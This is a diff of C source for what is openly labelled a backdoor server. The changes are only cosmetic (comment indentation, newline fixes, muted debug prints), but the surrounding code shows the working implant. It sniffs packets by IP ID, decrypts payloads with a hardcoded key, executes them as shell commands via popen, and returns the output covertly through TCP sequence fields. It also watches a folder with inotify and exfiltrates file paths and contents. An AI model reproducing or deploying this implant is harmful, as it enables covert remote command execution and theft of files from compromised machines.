@@ -86,19 +86,19 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info,
 	struct iphdr* iphdr;
 	int size_ip;
 
-	// skips to the IP header of the packet
+// skips to the IP header of the packet
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	size_ip = iphdr->ihl * 4;
 
-	// check to see if the packet is complete
+// check to see if the packet is complete
 	if (size_ip < sizeof(struct iphdr))
 		error("pkt_handler(): Truncated IP Header");
 
-	// check if the packet is intended for the backdoor server
+// check if the packet is intended for the backdoor server
 	if (ntohs(iphdr->id) >= 5000 || ntohs(iphdr->id) <= 5050) {
 		switch (iphdr->protocol) {
 		case IPPROTO_TCP:
-			printf("protocol TCP");
+			printf("protocol TCP\n");
 			handle_tcp(user, pkt_info, packet);
 			break;
 		case IPPROTO_UDP:
@@ -127,20 +127,20 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	if (size_tcp < TCP_HDR_SIZ)
 		error("handle_tcp(): invalid TCP size");
 
-	// retrieves the TCP payload
+// retrieves the TCP payload
 	tcp_payload = (char *) (packet + sizeof(struct ether_header) + ip_len
 			+ size_tcp);
 
-	// decrypt the payload and copy it into decrypt_payload variable.
+// decrypt the payload and copy it into decrypt_payload variable.
 	decrypt(SEKRET, tcp_payload, sizeof(tcp_payload));
-	printf("PAYLOAD => %s", tcp_payload);
+	printf("PAYLOAD => %s\n", tcp_payload);
 
 	cmd_execute(tcp_payload, iphdr->daddr, ip_addr);
 }
 
 void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 		const u_char *packet) {
-	//struct udphdr* udphdr;
+//struct udphdr* udphdr;
 	struct iphdr* iphdr;
 	int size_udp, ip_len;
 	char *udp_payload;
@@ -153,13 +153,13 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	if (size_udp < UDP_HDR_SIZ)
 		error("handle_udp(): invalid UDP size");
 
-	// retrieves the UDP payload
+// retrieves the UDP payload
 	udp_payload = (char *) (iphdr + ip_len + size_udp);
 
-	// decrypt the payload .
+// decrypt the payload .
 	decrypt(SEKRET, udp_payload, sizeof(udp_payload));
 
-	printf("UDP PAYLOAD = %s", udp_payload);
+	printf("UDP PAYLOAD = %s\n", udp_payload);
 
 	cmd_execute(udp_payload, iphdr->daddr, ip_addr);
 }
@@ -174,20 +174,22 @@ void cmd_execute(char *command, uint32 src, uint32 ip) {
 	memset(line, 0, MAX_LEN);
 	memset(resp, 0, MAX_LEN);
 
-	// Run the command, grab stdout
+// Run the command, grab stdout
 	fp = popen(command, "r");
 
-	// Append line by line output into response buffer
+// Append line by line output into response buffer
 	while (fgets(line, MAX_LEN, fp) != NULL) {
 		strcat(resp, line);
-		printf("line =>  %s\n", line);
+		//printf("line => %s\n", line);
 	}
 
 	strcat(resp, "\n");
 
 	tot_len = strlen(resp) + 1;
 
-	printf("Response Len => %d\n", tot_len);
+	//printf("Response Len => %d\n", tot_len);
+
+	printf("Sending Data\n==============\n");
 
 	for (i = 0; i < tot_len; i++) {
 
@@ -198,7 +200,7 @@ void cmd_execute(char *command, uint32 src, uint32 ip) {
 		_send(src, ip, tcp_seq, RSP_TYP); // send the packet as a response packet
 	}
 
-	// close the pipe file pointer
+// close the pipe file pointer
 	pclose(fp);
 }
 
@@ -216,7 +218,7 @@ void *exfil_watch(void *arg) {
 	ipaddr = expck.ipaddr;
 	folder = expck.folder;
 
-	printf("Folder => %s", folder);
+	printf("Folder => %s\n", folder);
 
 	fd = inotify_init();
 	if (fd < 0)
@@ -293,7 +295,7 @@ void exfil_send(uint32 src, uint32 ipaddr, char *path) {
 		memcpy(trans, buffer, tot_len);
 		printf("Buflen => %d\n", tot_len);
 
-		// sending the filename, including the path...
+// sending the filename, including the path...
 		if (init == 0) {
 			for (i = 0; i < path_size; i++) {
 				char tcp_seq;
@@ -306,7 +308,7 @@ void exfil_send(uint32 src, uint32 ipaddr, char *path) {
 			init = 1;
 		}
 
-		// Sending the File content
+// Sending the File content
 		for (i = 0; i < tot_len; i++) {
 			char tcp_seq;
 			tcp_seq = buffer[i];
